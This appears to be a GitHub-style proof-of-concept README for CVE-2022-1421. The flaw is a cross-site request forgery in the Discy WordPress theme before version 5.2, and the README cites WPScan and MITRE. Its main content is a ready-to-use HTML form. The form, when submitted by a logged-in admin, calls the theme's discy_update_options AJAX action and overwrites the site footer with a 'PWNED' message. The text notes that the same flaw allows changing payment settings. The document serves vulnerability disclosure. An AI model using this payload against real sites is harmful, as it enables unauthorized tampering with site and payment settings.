# CVE-2022-1421
A Proof-Of-Concept for CVE-2022-1421
## Discy < 5.2 - Settings Update via CSRF
Discy < 5.2 lacks CSRF checks in some AJAX actions, allowing an attacker to make a logged in admin change arbitrary plugin's settings including payment methods via a CSRF attack.

# Affected Theme
[Discy](https://themeforest.net/item/discy-social-questions-and-answers-wordpress-theme/19281265) < 5.2

# POC
```
<html>
  <body>
    <form action="https://target.com/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="discy_update_options">
      <input type="hidden" name="data" value="discy_options[footer_copyright]=You%20are%20ultra-PWNED">
      <input type="submit" value="Submit request">
    </form>
  </body>
</html> 
```

# References
https://wpscan.com/vulnerability/a7a24e8e-9056-4967-bcad-b96cc0c5b249

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1421
